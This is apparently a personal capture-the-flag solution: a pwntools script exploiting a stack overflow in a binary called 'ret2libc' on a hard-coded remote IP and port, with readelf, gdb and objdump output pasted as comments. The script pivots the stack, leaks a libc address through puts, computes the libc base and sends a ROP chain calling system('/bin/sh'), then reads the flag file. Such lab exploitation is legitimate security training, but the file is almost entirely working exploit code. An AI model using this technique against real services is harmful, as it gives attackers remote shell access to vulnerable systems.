#!/usr/bin/env python3
import pwn
import time

# Addresses and constants
# elf = pwn.ELF('source/ret2libc/ret2libc')
# puts_plt = elf.plt['puts']
# main = elf.symbols['main']
puts_plt = 0x401064
main = 0x4011a0

puts_got = 0x404018
setvbuf_got = 0x404028
read_got = 0x404020

stdin = 0x404050
stdout = 0x404040
rax = 0x401182

# Connect to the remote service
def connect_to_remote(ip, port):
    return pwn.remote(ip, port)

# Send initial payload to leak address
def send_initial_payload(p):
    payload = b"a" * 128
    GOT_setvbuf = setvbuf_got + 0x80 + 0x80  # 256 because of rbp
    p.sendline(payload + pwn.p64(GOT_setvbuf) + pwn.p64(rax))

# Send payload to leak puts address
def leak_puts_address(p):
    payload = pwn.p64(stdin + 0x80) + \
              pwn.p64(rax) + \
              b'a' * (stdin - setvbuf_got - 8 - 8) + \
              pwn.p64(0x404800 - 8) + \
              pwn.p64(rax) + \
              b'a' * (0x80 - (stdin - setvbuf_got - 8 - 8) - 8 * 4) + \
              pwn.p64(setvbuf_got + 0x80) + \
              pwn.p64(rax)
    p.sendline(payload)
    time.sleep(0.1)
    p.sendline(pwn.p64(puts_plt))
    time.sleep(0.1)
    p.sendline(pwn.p64(read_got))

# Receive the leaked address
def receive_leaked_address(p):
    payload = b'a' * 128 + \
              pwn.p64(0x404800) + \
              pwn.p64(0x4011b3)
    p.sendline(payload)
    read_addr = p.recvuntil(b'\n\x87(\xad\xfb', drop=True).ljust(8, b'\0')
    read_addr = pwn.u64(read_addr)
    p.recv()
    return read_addr

# Calculate libc base address
def calculate_libc_base(read_addr):
    libc_base = read_addr - 0x1147d0
    return libc_base

# Send payload to execute system('/bin/sh')
def send_system_payload(p, libc_base):
    payload = b'a' * 128 + \
              pwn.p64(0x404800) + \
              pwn.p64(libc_base + 0x2a3e5) + \
              pwn.p64(libc_base + 0x1d8678) + \
              pwn.p64(libc_base + 0x50d70) + \
              pwn.p64(libc_base + 0x455f0)
    """
              _rbp
              pop rdi; ret
              /bin/sh
              system
              EXIT
              """
    p.sendline(payload)
    time.sleep(0.1)
    p.sendline(b"cat flag.txt")

# Main function to execute the exploit
def remote(ip, port):
    p = connect_to_remote(ip, port)
    print(p.recv().decode())
    
    time.sleep(0.1)
    send_initial_payload(p)
    
    time.sleep(0.1)
    leak_puts_address(p)
    
    time.sleep(0.1)
    read_addr = receive_leaked_address(p)
    print(f"Leaked address: {hex(read_addr)}")
    
    time.sleep(0.1)
    libc_base = calculate_libc_base(read_addr)
    print(f"Libc base address: {hex(libc_base)}")
    
    time.sleep(0.1)
    send_system_payload(p, libc_base)
    time.sleep(0.1)
    print(p.recv().decode())

if __name__ == "__main__":
    remote('140.113.24.241', 30173)

"""
python_envrobert@robert-exp1:~/CTF/source/ret2libc$ readelf -r ./ret2libc 

Relocation section '.rela.dyn' at offset 0x540 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403ff0  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403ff8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000404040  000600000005 R_X86_64_COPY     0000000000404040 stdout@GLIBC_2.2.5 + 0
000000404050  000700000005 R_X86_64_COPY     0000000000404050 stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x5a0 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000404028  000500000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
"""

"""
python_envrobert@robert-exp1:~/CTF/source/ret2libc$ readelf -r ./ret2libc 

Relocation section '.rela.dyn' at offset 0x540 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403ff0  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403ff8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000404040  000600000005 R_X86_64_COPY     0000000000404040 stdout@GLIBC_2.2.5 + 0
000000404050  000700000005 R_X86_64_COPY     0000000000404050 stdin@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x5a0 contains 3 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000300000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000404028  000500000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
"""

"""
robert@robert-exp1:~/CTF/source/ret2libc$ gdb ./ret2libc
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ret2libc...
(No debugging symbols found in ./ret2libc)
(gdb) break hackMe
Breakpoint 1 at 0x40117e
(gdb) run
Starting program: /home/robert/CTF/source/ret2libc/ret2libc 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to the server!

Breakpoint 1, 0x000000000040117e in hackMe ()
(gdb) x/32x $rsp
0x7fffffffddb0: 0xffffddd0      0x00007fff      0x00401208      0x00000000
0x7fffffffddc0: 0xffffdee8      0x00007fff      0x00000000      0x00000001
0x7fffffffddd0: 0x00000001      0x00000000      0xf7db1d90      0x00007fff
0x7fffffffdde0: 0x00000000      0x00000000      0x004011a0      0x00000000
0x7fffffffddf0: 0x00000000      0x00000001      0xffffdee8      0x00007fff
0x7fffffffde00: 0x00000000      0x00000000      0x36f7448d      0x1b774f59
0x7fffffffde10: 0xffffdee8      0x00007fff      0x004011a0      0x00000000
0x7fffffffde20: 0x00403e18      0x00000000      0xf7ffd040      0x00007fff
(gdb) continue
Continuing.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x000000000040119f in hackMe ()
(gdb) info registers rip
rip            0x40119f            0x40119f <hackMe+41>
(gdb) x/32x $rsp
0x7fffffffddb8: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffddc8: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffddd8: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffdde8: 0x61616161      0x61616161      0x61616161      0x61616161
0x7fffffffddf8: 0xffffde0a      0x00007fff      0x00000000      0x00000000
0x7fffffffde08: 0x36f7448d      0x1b774f59      0xffffdee8      0x00007fff
0x7fffffffde18: 0x004011a0      0x00000000      0x00403e18      0x00000000
0x7fffffffde28: 0xf7ffd040      0x00007fff      0x8d35448d      0xe488b0a6
(gdb) p system
$1 = {int (const char *)} 0x7ffff7dd8d70 <__libc_system>
(gdb) p &exit
$2 = (void (*)(int)) 0x7ffff7dcd5f0 <__GI_exit>
(gdb) find &system, +9999999, "/bin/sh"
0x7ffff7f60678
warning: Unable to access 16000 bytes of target memory at 0x7ffff7fae880, halting search.
1 pattern found.
(gdb) p &puts
$1 = (int (*)(const char *)) 0x7ffff7e08e50 <__GI__IO_puts>
(gdb) p &read
$2 = (ssize_t (*)(int, void *, 
    size_t)) 0x7ffff7e9c7d0 <__GI___libc_read>
(gdb) p &getenv
$3 = (char *(*)(const char *)) 0x7ffff7dccb70 <__GI_getenv>
(gdb) p "FLAG"
$4 = "FLAG"
"""

"""
python_envrobert@robert-exp1:~/CTF$ objdump -d source/ret2libc/ret2libc 

source/ret2libc/ret2libc:     file format elf64-x86-64


Disassembly of section .init:

0000000000401000 <_init>:
  401000:       f3 0f 1e fa             endbr64 
  401004:       48 83 ec 08             sub    $0x8,%rsp
  401008:       48 8b 05 e9 2f 00 00    mov    0x2fe9(%rip),%rax        # 403ff8 <__gmon_start__@Base>
  40100f:       48 85 c0                test   %rax,%rax
  401012:       74 02                   je     401016 <_init+0x16>
  401014:       ff d0                   call   *%rax
  401016:       48 83 c4 08             add    $0x8,%rsp
  40101a:       c3                      ret    

Disassembly of section .plt:

0000000000401020 <.plt>:
  401020:       ff 35 e2 2f 00 00       push   0x2fe2(%rip)        # 404008 <_GLOBAL_OFFSET_TABLE_+0x8>
  401026:       f2 ff 25 e3 2f 00 00    bnd jmp *0x2fe3(%rip)        # 404010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40102d:       0f 1f 00                nopl   (%rax)
  401030:       f3 0f 1e fa             endbr64 
  401034:       68 00 00 00 00          push   $0x0
  401039:       f2 e9 e1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40103f:       90                      nop
  401040:       f3 0f 1e fa             endbr64 
  401044:       68 01 00 00 00          push   $0x1
  401049:       f2 e9 d1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40104f:       90                      nop
  401050:       f3 0f 1e fa             endbr64 
  401054:       68 02 00 00 00          push   $0x2
  401059:       f2 e9 c1 ff ff ff       bnd jmp 401020 <_init+0x20>
  40105f:       90                      nop

Disassembly of section .plt.sec:

0000000000401060 <puts@plt>:
  401060:       f3 0f 1e fa             endbr64 
  401064:       f2 ff 25 ad 2f 00 00    bnd jmp *0x2fad(%rip)        # 404018 <puts@GLIBC_2.2.5>
  40106b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401070 <read@plt>:
  401070:       f3 0f 1e fa             endbr64 
  401074:       f2 ff 25 a5 2f 00 00    bnd jmp *0x2fa5(%rip)        # 404020 <read@GLIBC_2.2.5>
  40107b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000401080 <setvbuf@plt>:
  401080:       f3 0f 1e fa             endbr64 
  401084:       f2 ff 25 9d 2f 00 00    bnd jmp *0x2f9d(%rip)        # 404028 <setvbuf@GLIBC_2.2.5>
  40108b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

Disassembly of section .text:

0000000000401090 <_start>:
  401090:       f3 0f 1e fa             endbr64 
  401094:       31 ed                   xor    %ebp,%ebp
  401096:       49 89 d1                mov    %rdx,%r9
  401099:       5e                      pop    %rsi
  40109a:       48 89 e2                mov    %rsp,%rdx
  40109d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  4010a1:       50                      push   %rax
  4010a2:       54                      push   %rsp
  4010a3:       45 31 c0                xor    %r8d,%r8d
  4010a6:       31 c9                   xor    %ecx,%ecx
  4010a8:       48 c7 c7 a0 11 40 00    mov    $0x4011a0,%rdi
  4010af:       ff 15 3b 2f 00 00       call   *0x2f3b(%rip)        # 403ff0 <__libc_start_main@GLIBC_2.34>
  4010b5:       f4                      hlt    
  4010b6:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  4010bd:       00 00 00 

00000000004010c0 <_dl_relocate_static_pie>:
  4010c0:       f3 0f 1e fa             endbr64 
  4010c4:       c3                      ret    
  4010c5:       66 2e 0f 1f 84 00 00    cs nopw 0x0(%rax,%rax,1)
  4010cc:       00 00 00 
  4010cf:       90                      nop

00000000004010d0 <deregister_tm_clones>:
  4010d0:       b8 40 40 40 00          mov    $0x404040,%eax
  4010d5:       48 3d 40 40 40 00       cmp    $0x404040,%rax
  4010db:       74 13                   je     4010f0 <deregister_tm_clones+0x20>
  4010dd:       b8 00 00 00 00          mov    $0x0,%eax
  4010e2:       48 85 c0                test   %rax,%rax
  4010e5:       74 09                   je     4010f0 <deregister_tm_clones+0x20>
  4010e7:       bf 40 40 40 00          mov    $0x404040,%edi
  4010ec:       ff e0                   jmp    *%rax
  4010ee:       66 90                   xchg   %ax,%ax
  4010f0:       c3                      ret    
  4010f1:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  4010f8:       00 00 00 00 
  4010fc:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401100 <register_tm_clones>:
  401100:       be 40 40 40 00          mov    $0x404040,%esi
  401105:       48 81 ee 40 40 40 00    sub    $0x404040,%rsi
  40110c:       48 89 f0                mov    %rsi,%rax
  40110f:       48 c1 ee 3f             shr    $0x3f,%rsi
  401113:       48 c1 f8 03             sar    $0x3,%rax
  401117:       48 01 c6                add    %rax,%rsi
  40111a:       48 d1 fe                sar    %rsi
  40111d:       74 11                   je     401130 <register_tm_clones+0x30>
  40111f:       b8 00 00 00 00          mov    $0x0,%eax
  401124:       48 85 c0                test   %rax,%rax
  401127:       74 07                   je     401130 <register_tm_clones+0x30>
  401129:       bf 40 40 40 00          mov    $0x404040,%edi
  40112e:       ff e0                   jmp    *%rax
  401130:       c3                      ret    
  401131:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  401138:       00 00 00 00 
  40113c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401140 <__do_global_dtors_aux>:
  401140:       f3 0f 1e fa             endbr64 
  401144:       80 3d 0d 2f 00 00 00    cmpb   $0x0,0x2f0d(%rip)        # 404058 <completed.0>
  40114b:       75 13                   jne    401160 <__do_global_dtors_aux+0x20>
  40114d:       55                      push   %rbp
  40114e:       48 89 e5                mov    %rsp,%rbp
  401151:       e8 7a ff ff ff          call   4010d0 <deregister_tm_clones>
  401156:       c6 05 fb 2e 00 00 01    movb   $0x1,0x2efb(%rip)        # 404058 <completed.0>
  40115d:       5d                      pop    %rbp
  40115e:       c3                      ret    
  40115f:       90                      nop
  401160:       c3                      ret    
  401161:       66 66 2e 0f 1f 84 00    data16 cs nopw 0x0(%rax,%rax,1)
  401168:       00 00 00 00 
  40116c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000401170 <frame_dummy>:
  401170:       f3 0f 1e fa             endbr64 
  401174:       eb 8a                   jmp    401100 <register_tm_clones>

0000000000401176 <hackMe>:
  401176:       f3 0f 1e fa             endbr64 
  40117a:       55                      push   %rbp
  40117b:       48 89 e5                mov    %rsp,%rbp
  40117e:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  401182:       48 8d 45 80             lea    -0x80(%rbp),%rax
  401186:       ba 00 01 00 00          mov    $0x100,%edx
  40118b:       48 89 c6                mov    %rax,%rsi
  40118e:       bf 00 00 00 00          mov    $0x0,%edi
  401193:       b8 00 00 00 00          mov    $0x0,%eax
  401198:       e8 d3 fe ff ff          call   401070 <read@plt>
  40119d:       90                      nop
  40119e:       c9                      leave  
  40119f:       c3                      ret    

00000000004011a0 <main>:
  4011a0:       f3 0f 1e fa             endbr64 
  4011a4:       55                      push   %rbp
  4011a5:       48 89 e5                mov    %rsp,%rbp
  4011a8:       48 83 ec 10             sub    $0x10,%rsp
  4011ac:       89 7d fc                mov    %edi,-0x4(%rbp)
  4011af:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  4011b3:       48 8b 05 96 2e 00 00    mov    0x2e96(%rip),%rax        # 404050 <stdin@GLIBC_2.2.5>
  4011ba:       b9 00 00 00 00          mov    $0x0,%ecx
  4011bf:       ba 02 00 00 00          mov    $0x2,%edx
  4011c4:       be 00 00 00 00          mov    $0x0,%esi
  4011c9:       48 89 c7                mov    %rax,%rdi
  4011cc:       e8 af fe ff ff          call   401080 <setvbuf@plt>
  4011d1:       48 8b 05 68 2e 00 00    mov    0x2e68(%rip),%rax        # 404040 <stdout@GLIBC_2.2.5>
  4011d8:       b9 00 00 00 00          mov    $0x0,%ecx
  4011dd:       ba 02 00 00 00          mov    $0x2,%edx
  4011e2:       be 00 00 00 00          mov    $0x0,%esi
  4011e7:       48 89 c7                mov    %rax,%rdi
  4011ea:       e8 91 fe ff ff          call   401080 <setvbuf@plt>
  4011ef:       48 8d 05 0e 0e 00 00    lea    0xe0e(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
  4011f6:       48 89 c7                mov    %rax,%rdi
  4011f9:       e8 62 fe ff ff          call   401060 <puts@plt>
  4011fe:       b8 00 00 00 00          mov    $0x0,%eax
  401203:       e8 6e ff ff ff          call   401176 <hackMe>
  401208:       48 8d 05 0c 0e 00 00    lea    0xe0c(%rip),%rax        # 40201b <_IO_stdin_used+0x1b>
  40120f:       48 89 c7                mov    %rax,%rdi
  401212:       e8 49 fe ff ff          call   401060 <puts@plt>
  401217:       b8 00 00 00 00          mov    $0x0,%eax
  40121c:       c9                      leave  
  40121d:       c3                      ret    

Disassembly of section .fini:

0000000000401220 <_fini>:
  401220:       f3 0f 1e fa             endbr64 
  401224:       48 83 ec 08             sub    $0x8,%rsp
  401228:       48 83 c4 08             add    $0x8,%rsp
  40122c:       c3                      ret    
"""